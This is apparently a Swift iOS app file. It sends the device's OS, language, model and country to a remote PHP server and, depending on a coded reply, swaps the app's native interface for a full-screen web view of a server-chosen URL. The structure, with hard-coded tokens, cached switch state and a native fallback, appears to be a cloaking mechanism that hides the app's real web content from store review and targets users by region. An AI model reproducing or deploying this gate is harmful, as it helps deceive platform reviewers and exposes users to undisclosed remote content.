

import SwiftUI
import WebKit
import UIKit
import UniformTypeIdentifiers
import PhotosUI

enum KeychainError: Error {
    case notFound
    case unexpectedStatus(OSStatus)
}

func storeSecureValue(key: String, value: String) throws {
    let data = Data(value.utf8)
    let baseQuery: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key
    ]
    let attributes: [String: Any] = [kSecValueData as String: data]
    
    let status = SecItemCopyMatching(baseQuery as CFDictionary, nil)
    if status == errSecSuccess {
        let update = SecItemUpdate(baseQuery as CFDictionary, attributes as CFDictionary)
        guard update == errSecSuccess else { throw KeychainError.unexpectedStatus(update) }
    } else if status == errSecItemNotFound {
        var newItem = baseQuery
        newItem[kSecValueData as String] = data
        let add = SecItemAdd(newItem as CFDictionary, nil)
        guard add == errSecSuccess else { throw KeychainError.unexpectedStatus(add) }
    } else {
        throw KeychainError.unexpectedStatus(status)
    }
}

func fetchSecureValue(key: String) throws -> String {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne
    ]
    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    if status == errSecSuccess {
        guard let data = result as? Data,
              let text = String(data: data, encoding: .utf8) else {
            throw KeychainError.unexpectedStatus(status)
        }
        return text
    } else if status == errSecItemNotFound {
        throw KeychainError.notFound
    } else {
        throw KeychainError.unexpectedStatus(status)
    }
}

func systemVersionInfo() -> String { "\(UIDevice.current.systemName) \(UIDevice.current.systemVersion)" }

func currentLanguageCode() -> String {
    let lang = Locale.preferredLanguages.first ?? "en"
    return lang.components(separatedBy: "-").first?.lowercased() ?? "en"
}

func hardwareModelIdentifier() -> String {
    var sys = utsname()
    uname(&sys)
    return Mirror(reflecting: sys.machine).children.reduce(into: "") { result, element in
        if let value = element.value as? Int8, value != 0 {
            result.append(Character(UnicodeScalar(UInt8(value))))
        }
    }
}

func activeRegionCode() -> String? { Locale.current.regionCode }

struct RemoteConfig {
    static let verifyKey       = "GJDFHDFHFDJGSDAGKGHK"
    static let endpointURL     = "https://wallen-eatery.space/ios-ha-8/server.php"
    static let accessKey       = "Bs2675kDjkb5Ga"
    static let cacheURLKey     = "cachedTrustedURL"
    static let cacheTokenKey   = "cachedVerificationToken"
}

final class AccessController: ObservableObject {
    @MainActor @Published var current = Status.idle
    
    enum Status {
        case idle, validating
        case approved(token: String, url: URL)
        case useNative
    }
    
    func beginCheck() {
        if let storedURLString = UserDefaults.standard.string(forKey: RemoteConfig.cacheURLKey),
           let cachedURL = URL(string: storedURLString),
           let savedToken = try? fetchSecureValue(key: RemoteConfig.cacheTokenKey),
           savedToken == RemoteConfig.verifyKey {
            
            Task { @MainActor in
                current = .approved(token: savedToken, url: cachedURL)
            }
            return
        }
        Task { await performRemoteFetch() }
    }
    
    private func performRemoteFetch() async {
        await MainActor.run { current = .validating }
        
        guard let url = prepareRequestURL() else {
            await MainActor.run { current = .useNative }
            return
        }
        
        var tries = 0
        while true {
            tries += 1
            do {
                let result = try await fetchTextResponse(from: url)
                let segments = result.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: "#")
                
                if segments.count == 2,
                   segments[0] == RemoteConfig.verifyKey,
                   let goodURL = URL(string: segments[1]) {
                    
                    UserDefaults.standard.set(goodURL.absoluteString, forKey: RemoteConfig.cacheURLKey)
                    try? storeSecureValue(key: RemoteConfig.cacheTokenKey, value: segments[0])
                    
                    await MainActor.run { current = .approved(token: segments[0], url: goodURL) }
                    return
                } else {
                    await MainActor.run { current = .useNative }
                    return
                }
            } catch {
                let delay = min(pow(2.0, Double(min(tries, 6))), 30.0)
                try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
            }
        }
    }
    
    private func fetchTextResponse(from url: URL) async throws -> String {
        let (data, _) = try await URLSession.shared.data(from: url)
        return String(decoding: data, as: UTF8.self)
    }
    
    private func prepareRequestURL() -> URL? {
        var comps = URLComponents(string: RemoteConfig.endpointURL)
        comps?.queryItems = [
            URLQueryItem(name: "p", value: RemoteConfig.accessKey),
            URLQueryItem(name: "os", value: systemVersionInfo()),
            URLQueryItem(name: "lng", value: currentLanguageCode()),
            URLQueryItem(name: "devicemodel", value: hardwareModelIdentifier())
        ]
        if let country = activeRegionCode() {
            comps?.queryItems?.append(URLQueryItem(name: "country", value: country))
        }
        
        return comps?.url
    }
}

@available(iOS 14.0, *)
final class SecureWebHost: UIViewController, WKUIDelegate, WKNavigationDelegate, UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    
    var onLoadState: ((Bool) -> Void)?
    private var webView: WKWebView!
    private var entryURL: URL
    fileprivate var fileCompletion: (([URL]?) -> Void)?
    
    init(url: URL) {
        self.entryURL = url
        super.init(nibName: nil, bundle: nil)
        configureWebView()
    }
    required init?(coder: NSCoder) { fatalError() }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        if #available(iOS 11.0, *) {
            webView.insetsLayoutMarginsFromSafeArea = false
            webView.scrollView.contentInsetAdjustmentBehavior = .never
        }
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
        onLoadState?(true)
        webView.load(URLRequest(url: entryURL))
    }
    
    private func configureWebView() {
        let config = WKWebViewConfiguration()
        config.preferences.javaScriptEnabled = true
        config.websiteDataStore = .default()
        
        webView = WKWebView(frame: .zero, configuration: config)
        webView.uiDelegate = self
        webView.navigationDelegate = self
        webView.scrollView.bounces = false
        webView.scrollView.minimumZoomScale = 1.0
        webView.scrollView.maximumZoomScale = 1.0
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        onLoadState?(false)
    }
    
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        onLoadState?(false)
    }
}

@available(iOS 14.0, *)
extension SecureWebHost {
    func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
        fileCompletion?(urls)
    }
    func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
        fileCompletion?(nil)
    }
    
    @available(iOS 18.4, *)
    func webView(_ webView: WKWebView,
                 runOpenPanelWith parameters: WKOpenPanelParameters,
                 initiatedByFrame frame: WKFrameInfo,
                 completionHandler: @escaping ([URL]?) -> Void) {
        self.fileCompletion = completionHandler
        
        let alert = UIAlertController(title: "Choose File", message: nil, preferredStyle: .actionSheet)
        
        alert.addAction(UIAlertAction(title: "Photo/Video", style: .default) { _ in
            var config = PHPickerConfiguration(photoLibrary: .shared())
            config.selectionLimit = 1
            config.filter = .any(of: [.images, .videos])
            
            let picker = PHPickerViewController(configuration: config)
            picker.delegate = self
            self.present(picker, animated: true)
        })
        
        alert.addAction(UIAlertAction(title: "Files", style: .default) { _ in
            let picker = UIDocumentPickerViewController(forOpeningContentTypes: [.item], asCopy: true)
            picker.delegate = self
            picker.allowsMultipleSelection = false
            self.present(picker, animated: true)
        })
        
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel) { _ in
            completionHandler(nil)
        })
        
        present(alert, animated: true)
    }
    
    func picker(_ picker: PHPickerViewController, didFinishPicking results: [PHPickerResult]) {
        picker.dismiss(animated: true)
        for provider in results.map({ $0.itemProvider }) {
            if provider.hasItemConformingToTypeIdentifier(UTType.image.identifier) {
                provider.loadFileRepresentation(forTypeIdentifier: UTType.image.identifier) { url, _ in
                    if let url = url {
                        DispatchQueue.main.async { self.fileCompletion?([url]) }
                    }
                }
            }
        }
    }
}

@available(iOS 14.0, *)
struct SecureWebView: UIViewControllerRepresentable {
    let url: URL
    @Binding var loading: Bool
    
    func makeUIViewController(context: Context) -> SecureWebHost {
        let vc = SecureWebHost(url: url)
        vc.onLoadState = { active in
            DispatchQueue.main.async { loading = active }
        }
        return vc
    }
    
    func updateUIViewController(_ vc: SecureWebHost, context: Context) {}
}
